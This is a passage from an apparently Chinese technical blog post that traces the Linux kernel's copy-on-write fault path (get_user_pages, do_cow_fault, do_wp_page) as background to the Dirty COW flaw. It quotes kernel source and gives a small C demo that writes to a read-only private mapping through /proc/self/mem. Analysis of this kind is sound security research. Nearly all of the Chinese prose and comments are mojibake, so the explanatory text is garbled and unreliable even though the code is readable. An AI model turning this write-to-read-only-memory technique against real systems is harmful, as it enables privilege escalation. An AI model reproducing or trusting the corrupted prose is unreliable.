&amp;= ~FOLL_WRITE;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="å¤§è‡´çš„æµç¨‹"><a href="#å¤§è‡´çš„æµç¨‹" class="headerlink" title="å¤§è‡´çš„æµç¨‹"></a>å¤§è‡´çš„æµç¨‹</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">mem_write</span>()<br>	<span class="hljs-built_in">mem_rw</span>()<br>		<span class="hljs-built_in">__access_remote_vm</span>()<br>			<span class="hljs-built_in">__get_user_pages_remote</span>()<br>				<span class="hljs-built_in">__get_user_pages_locked</span>()<br>					<span class="hljs-built_in">__get_user_pages</span>()<br>						<span class="hljs-built_in">follow_page_mask</span>()<br>							<span class="hljs-built_in">follow_page_pte</span>()<br>						<span class="hljs-built_in">faultin_page</span>()<br></code></pre></td></tr></table></figure>

<h3 id="get-user-pagesã®å¥‡å¦™æ—…é€”ğŸ¤”"><a href="#get-user-pagesã®å¥‡å¦™æ—…é€”ğŸ¤”" class="headerlink" title="__get_user_pagesã®å¥‡å¦™æ—…é€”ğŸ¤”"></a>__get_user_pagesã®å¥‡å¦™æ—…é€”ğŸ¤”</h3><h4 id="æµ‹è¯•demo"><a href="#æµ‹è¯•demo" class="headerlink" title="æµ‹è¯•demo"></a>æµ‹è¯•demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;./test&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="get-user-pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯"><a href="#get-user-pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯" class="headerlink" title="__get_user_pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯"></a>__get_user_pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯</h4><p>ç”±äº<code>linux</code>çš„å†…æ ¸çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œç¬¬ä¸€æ¬¡è®¿é—®æŸä¸ªå†…å­˜é¡µä¹‹å‰<code>linux kernel</code> å¹¶ä¸ä¼šä¸ºå…¶åˆ†é…ç‰©ç†é¡µï¼Œæ‰€ä»¥è·å–ä¸åˆ°å¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œå› æ­¤ç¬¬ä¸€æ¬¡è¿›å…¥<code>follow_page_mask</code>è‡ªç„¶æ˜¯è¿”å›NULLï¼Œæ­¤æ—¶è°ƒç”¨<code>faultin_page()</code>ï¼Œè¿›å…¥<code>handle_mm_fault</code>ï¼Œå¼€å§‹ç¼ºé¡µå¼‚å¸¸å¤„ç†</p>
<p><code>__handle_mm_fault()</code>è´Ÿè´£åˆ†é…å„çº§é¡µè¡¨é¡¹, ç„¶åè°ƒç”¨<code>handle_pte_fault()</code></p>
<p><code>handle_pte_fault()</code>å‘ç°æ˜¯æ˜ å°„åˆ°æ–‡ä»¶, ä½†æ•´ä¸ª<code>PTE</code>ä¸º<code>none</code>çš„æƒ…å†µ, ä¼šè°ƒç”¨<code>do_fault()</code>å¤„ç†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//å¦‚æœ fe-&gt;pte ä¸ºç©ºï¼Œåˆ™è¯´æ˜é¡µé¢ä¸å­˜åœ¨ï¼Œæ ¹æ® VMAï¼ˆVirtual Memory Areaï¼‰æ˜¯å¦åŒ¿åæ‰§è¡Œä¸åŒçš„é¡µé¢å¤„ç†æ“ä½œã€‚</span><br>		<span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br>			<span class="hljs-keyword">return</span> do_anonymous_page(fe);<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//åˆ†é…ç‰©ç†é¡µæ¡†</span><br>	&#125;<br></code></pre></td></tr></table></figure>

<p><code>do_fault()</code>å‘ç°éœ€è¦å†™å…¥ç§æœ‰æ–‡ä»¶æ˜ å°„çš„å†…å­˜åŒºå°±ä¼šè°ƒç”¨<code>do_cow_fault()</code>è¿›è¡Œå†™æ—¶å¤åˆ¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//å¦‚æœè™šæ‹Ÿå†…å­˜åŒºåŸŸçš„æ ‡å¿—ä¸­ä¸åŒ…å« VM_SHARED æ ‡å¿—ï¼Œè¯´æ˜è¯¥åŒºåŸŸæ˜¯ç§æœ‰çš„ï¼Œå‡½æ•°è°ƒç”¨ do_cow_fault å‡½æ•°å¤„ç†å†™æ—¶å¤åˆ¶é”™è¯¯ï¼ˆCopy-On-Write Faultï¼‰ã€‚</span><br>		<span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br></code></pre></td></tr></table></figure>

<ul>
<li>é¦–å…ˆè°ƒç”¨<code>alloc_page_vma()</code>åˆ†é…ä¸€ä¸ªæ–°é¡µ</li>
<li>ç„¶åè°ƒç”¨<code>__do_fault()</code>éœ€è¦æ‰¾<code>address</code>å¯¹åº”çš„åŸå§‹é¡µçš„æè¿°ç¬¦</li>
<li>ç„¶åè°ƒç”¨<code>copy_user_highpage()</code>æŠŠåŸå§‹é¡µçš„å†…å®¹å¤åˆ¶åˆ°æ–°é¡µä¸­</li>
<li>æ–°æ—§é¡µéƒ½è¢«æ˜ å°„åˆ°å†…æ ¸åœ°å€ç©ºé—´ä¸­, å› æ­¤å¤åˆ¶çš„æ—¶å€™ç›´æ¥<code>memcpy()</code>å°±å¯ä»¥</li>
<li>æœ€åè°ƒç”¨<code>alloc_set_pte()</code>è®¾ç½®é¡µè¡¨çš„<strong>PTE</strong>, å»ºç«‹åå‘æ˜ å°„</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br> <span class="hljs-type">void</span> *fault_entry;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br> <span class="hljs-type">int</span> ret;<br><br> <span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//ä¸ºå½“å‰è¿›ç¨‹åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢</span><br> <span class="hljs-keyword">if</span> (!new_page)<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> <span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//ä¸ºæ–°é¡µé¢åˆ†é…å†…å­˜èµ„æº</span><br>    &amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>  put_page(new_page);<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br> &#125;<br><br> ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//è¯»å–æ–‡ä»¶å†…å®¹åˆ°fault_page</span><br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br><br> <span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>  copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//æ‹·è´fault_pageå†…å®¹åˆ°new_page</span><br> __SetPageUptodate(new_page);<br><br> ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//è®¾ç½®pteï¼Œç½®æ¢è¯¥è¿›ç¨‹ä¸­çš„pteè¡¨é¡¹ï¼Œå¯¹äºå†™æ“ä½œä¼šå°†è¯¥é¡µæ ‡è„ï¼ˆè¯¥å‡½æ•°ä¼šè°ƒç”¨maybe_mkwrite()å‡½æ•°ï¼Œå…¶ä¼šè°ƒç”¨pte_mkdirty()å‡½æ•°æ ‡è„è¯¥é¡µï¼‰</span><br> <span class="hljs-keyword">if</span> (fe-&gt;pte)<br>  pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br> <span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//é‡Šæ”¾fault_page</span><br>  unlock_page(fault_page);<br>  put_page(fault_page);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>  dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br> &#125;<br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br> <span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br> mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br> put_page(new_page);<br> <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>alloc_set_pte()</code>æµç¨‹å¦‚ä¸‹, åœ¨æœ¬æµ‹è¯•ç¨‹åºä¸­, ç”±äºè¿›è¡Œ<code>COW</code>çš„<code>VMA</code>åŒºåŸŸä¸å¯å†™å…¥, å› æ­¤å¾—åˆ°çš„<code>COW</code>é¡µåªæœ‰è„æ ‡å¿—, æ²¡æœ‰å¯å†™æ ‡å¿—</p>
<p>æ³¨æ„è¿™é‡Œçš„<code>set_pte_at()</code>, ä¼šæŠŠæè¿°æ­¤ç‰©ç†é¡µçš„<code>pte</code>å†™å…¥åˆ°<code>vma-&gt;vm_mm</code>è¿™ä¸ªåœ°å€ç©ºé—´çš„é¡µè¡¨ä¸­, ä¹Ÿå°±æ˜¯è®©å…¶ä»–ç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜æ˜ å°„åˆ°è¿™ä¸ªç‰©ç†é¡µä¸­.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_set_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-keyword">struct</span> mem_cgroup *memcg,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> page *page)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-type">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;<br>	<span class="hljs-type">pte_t</span> entry;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (pmd_none(*fe-&gt;pmd) &amp;&amp; PageTransCompound(page) &amp;&amp;<br>			IS_ENABLED(CONFIG_TRANSPARENT_HUGE_PAGECACHE)) &#123;<br>		<span class="hljs-comment">/* THP on COW? */</span><br>		VM_BUG_ON_PAGE(memcg, page);<br><br>		ret = do_set_pmd(fe, page);<br>		<span class="hljs-keyword">if</span> (ret != VM_FAULT_FALLBACK)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<br>		ret = pte_alloc_one_map(fe);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-comment">/* Re-check under ptl */</span><br>	<span class="hljs-keyword">if</span> (unlikely(!pte_none(*fe-&gt;pte)))<br>		<span class="hljs-keyword">return</span> VM_FAULT_NOPAGE;<br><br>	flush_icache_page(vma, page);<br>	entry = mk_pte(page, vma-&gt;vm_page_prot);	<span class="hljs-comment">//æ ¹æ®é¡µç‰©ç†åœ°å€ä¸VMAæƒé™ç”ŸæˆPTE</span><br>	<span class="hljs-keyword">if</span> (write)								 <span class="hljs-comment">//pte_mkdirtyä¼šç»™PTEåŠ ä¸Šè„ä½</span><br>		entry = maybe_mkwrite(pte_mkdirty(entry), vma); <span class="hljs-comment">//å¦‚æœè¿™ç‰‡VMAå¯å†™ï¼Œé‚£ä¹ˆmaybe_mkwrite()ä¼šç»™PTEåŠ ä¸Šå¯å†™ä½</span><br>	<span class="hljs-comment">/* copy-on-write page */</span><br>    <span class="hljs-comment">//å»ºç«‹åå‘æ˜ å°„ï¼šä»pageå¯¹è±¡è§¦å‘ï¼Œæ‰¾åˆ°æ˜ å°„åˆ°æ­¤çš„VMA</span><br>	<span class="hljs-keyword">if</span> (write &amp;&amp; !(vma-&gt;vm_flags &amp; VM_SHARED)) &#123;<br>		inc_mm_counter_fast(vma-&gt;vm_mm, MM_ANONPAGES);<br>		page_add_new_anon_rmap(page, vma, fe-&gt;address, <span class="hljs-literal">false</span>);<br>		mem_cgroup_commit_charge(page, memcg, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>		lru_cache_add_active_or_unevictable(page, vma);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		inc_mm_counter_fast(vma-&gt;vm_mm, mm_counter_file(page));<br>		page_add_file_rmap(page, <span class="hljs-literal">false</span>);<br>	&#125;<br>    <span class="hljs-comment">//åœ¨é¡µè¡¨ä¸­è®¾ç½®PTE</span><br>	set_pte_at(vma-&gt;vm_mm, fe-&gt;address, fe-&gt;pte, entry);<br><br>	<span class="hljs-comment">/* no need to invalidate: a not-present page won&#x27;t be cached */</span><br>    <span class="hljs-comment">//æ›´æ–°MMUç¼“å­˜</span><br>	update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<p>è°ƒç”¨é“¾å¦‚ä¸‹</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br>	<span class="hljs-built_in">handle_mm_fault</span>()<br>		<span class="hljs-built_in">__handle_mm_fault</span>()<br>			<span class="hljs-built_in">handle_pte_fault</span>()<br>				<span class="hljs-built_in">do_fault</span>()<br>					<span class="hljs-built_in">do_cow_fault</span>()<br>						<span class="hljs-built_in">alloc_set_pte</span>()<br>							<span class="hljs-built_in">maybe_mkwrite</span>()<br>								<span class="hljs-built_in">pte_mkdirty</span>()<br>			<br></code></pre></td></tr></table></figure>

<h4 id="get-user-pagesã®ç¬¬äºŒæ¬¡å¾ªç¯"><a href="#get-user-pagesã®ç¬¬äºŒæ¬¡å¾ªç¯" class="headerlink" title="__get_user_pagesã®ç¬¬äºŒæ¬¡å¾ªç¯"></a>__get_user_pagesã®ç¬¬äºŒæ¬¡å¾ªç¯</h4><p>åˆ†é…åˆ°<code>COW</code>é¡µä¹‹åå›åˆ°<code>retry</code>ï¼Œç¬¬äºŒæ¬¡è¿›å…¥<code>follow_page_mask()</code>ï¼Œè¿™æ¬¡ä¸€åˆ‡æ­£å¸¸ï¼Œè¿›å…¥<code>follow_page_pte()</code></p>
<p>butç”±äº<code>PTE</code>ä¸å¯å†™å…¥, ä¸”<code>flags</code>ä¸­è®¾ç½®äº†<strong>FOLL_WRITE</strong>æ ‡å¿—, å› æ­¤ä¼šå†æ¬¡å¤±è´¥ï¼Œ<code>follow_page_mask()</code>è¿”å›å€¼ä¸º<strong>NULL</strong>ï¼Œç»§ç»­è¿›å…¥<code>faultin_page</code>å¤„ç†ç¼ºé¡µå¼‚å¸¸</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//å¦‚æœè¦æ±‚å†™å…¥ï¼Œä½†æ˜¯pteè¡¨ç¤ºä¸å¯å†™å…¥</span><br>		pte_unmap_unlock(ptep, ptl);<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>ç”±äºè¦è¿›è¡Œå†™å…¥æ“ä½œ, å¹¶ä¸”å¯¹åº”é¡µå­˜åœ¨, å› æ­¤<code>handle_pte_fault()</code>ä¼šè°ƒç”¨<code>do_wp_page()</code>è¿›è¡Œå†™æ—¶å¤åˆ¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//å­˜åœ¨ FAULT_FLAG_WRITE æ ‡å¿—ä½ï¼Œè¡¨ç¤ºç¼ºé¡µå¼‚å¸¸ç”±å†™æ“ä½œå¼•èµ·</span><br>		<span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//å¯¹åº”çš„é¡µä¸å¯å†™</span><br>			<span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//è¿›è¡Œå†™æ—¶å¤åˆ¶ï¼Œå°†å†…å®¹å†™å…¥ç”± do_fault()-&gt;do_cow_fault()åˆ†é…çš„å†…å­˜é¡µä¸­</span><br></code></pre></td></tr></table></figure>

<p><code>do_wp_page()</code>æµç¨‹å¦‚ä¸‹</p>
<ul>
<li><ul>
<li>è°ƒç”¨<code>vm_normal_page()</code> æ ¹æ®<code>address</code>æ‰¾åˆ°å¯¹åº”çš„é¡µæè¿°ç¬¦</li>
<li>å¦‚æœå‘ç°æ˜¯åŒ¿åé¡µ, å¹¶ä¸”æ­¤é¡µåªæœ‰ä¸€ä¸ªå¼•ç”¨, é‚£ä¹ˆä¼šè°ƒç”¨<code>wp_page_reuse()</code>ç›´æ¥é‡ç”¨è¿™ä¸ªé¡µ.</li>
<li>ç¬¬ä¸€æ¬¡<code>faultin_page()</code>æ—¶è¿›å…¥<code>do_cow_fault()</code>, å°±å·²ç»ä¸“é—¨å¤åˆ¶äº†ä¸€é¡µ, å› æ­¤ä¼šç›´æ¥è¿›å…¥<code>wp_page_reuse()</code> é‡ç”¨è¿™ä¸ªé¡µ</li>
</ul>
</li>
<li></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//èƒ½å¦é‡ç”¨ä¸€ä¸ªé¡µ</span><br><span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123;<br>    		<span class="hljs-comment">//å¦‚æœè¿™ä¸ªåŒ¿åé¡µåªæœ‰ä¸€ä¸ªæ˜ å°„ï¼Œé‚£ä¹ˆä¸ç”¨é‡æ–°åˆ†é…é¡µï¼Œç›´æ¥æŠŠæ—§é¡µæ‹¿å»å†™</span><br>			<span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br>				<span class="hljs-comment">/*</span><br><span class="hljs-comment">				 * The page is all ours. Move it to</span><br><span class="hljs-comment">				 * our anon_vma so the rmap code will</span><br><span class="hljs-comment">				 * not search our parent or siblings.</span><br><span class="hljs-comment">				 * Protected against the rmap code by</span><br><span class="hljs-comment">				 * the page lock.</span><br><span class="hljs-comment">				 */</span><br>                <span class="hljs-comment">//æŠŠæ—§ä¸šæ”¾åˆ°anon_vmaä¸­ï¼Œè¿™ä¸ªæ¶‰åŠåˆ°åå‘æ˜ å°„</span><br>				page_move_anon_rmap(old_page, vma);<br>			&#125;<br>			unlock_page(old_page);<br>    		<span class="hljs-comment">//æ—§é¡µåªå±äºè¿™ä¸ªè¿›ç¨‹ï¼Œå°è¯•ç»™PTEåŠ ä¸Šå¯å†™å…¥æ ‡å¿—</span><br>			<span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>		&#125;<br></code></pre></td></tr></table></figure>

<p><code>wp_page_reuse()</code>ä¸»è¦å°±æ˜¯è®¾ç½®<strong>PTE</strong>, ç„¶åè¿”å›<strong>VM_FAULT_WRITE</strong></p>
<ul>
<li><ul>
<li>æ³¨æ„ç”±äºè¿™ç‰‡<strong>VMA</strong>ä¸å¯å†™å…¥,å› æ­¤<strong>PTE</strong>ä»»ç„¶æ²¡æœ‰<strong>RW</strong>æ ‡å¿—,</li>
</ul>
</li>
<li></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wp_page_reuse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte,</span><br><span class="hljs-params">			<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">int</span> page_mkwrite, <span class="hljs-type">int</span> dirty_shared)</span><br>	__<span class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-type">pte_t</span> entry;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Clear the pages cpupid information as the existing</span><br><span class="hljs-comment">	 * information potentially belongs to a now completely</span><br><span class="hljs-comment">	 * unrelated process.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (page)<br>		page_cpupid_xchg_last(page, (<span class="hljs-number">1</span> &lt;&lt; LAST_CPUPID_SHIFT) - <span class="hljs-number">1</span>);<br><br>	flush_cache_page(vma, fe-&gt;address, pte_pfn(orig_pte));<br>	entry = pte_mkyoung(orig_pte);									<span class="hljs-comment">//æ ‡è®°ä¸‹åˆšåˆšè®¿é—®è¿‡</span><br>	entry = maybe_mkwrite(pte_mkdirty(entry), vma);					  <span class="hljs-comment">//è®¾ç½®è„ä½ï¼Œå¦‚æœVMAå¯å†™çš„è¯è®¾ç½®å†™å…¥ä½</span><br>	<span class="hljs-keyword">if</span> (ptep_set_access_flags(vma, fe-&gt;address, fe-&gt;pte, entry, <span class="hljs-number">1</span>))	   <span class="hljs-comment">//å†™å…¥PTE</span><br>		update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte);				 <span class="hljs-comment">//æ›´æ–°mmuç¼“å­˜</span><br>	pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><br>	<span class="hljs-keyword">if</span> (dirty_shared) &#123;<br>		<span 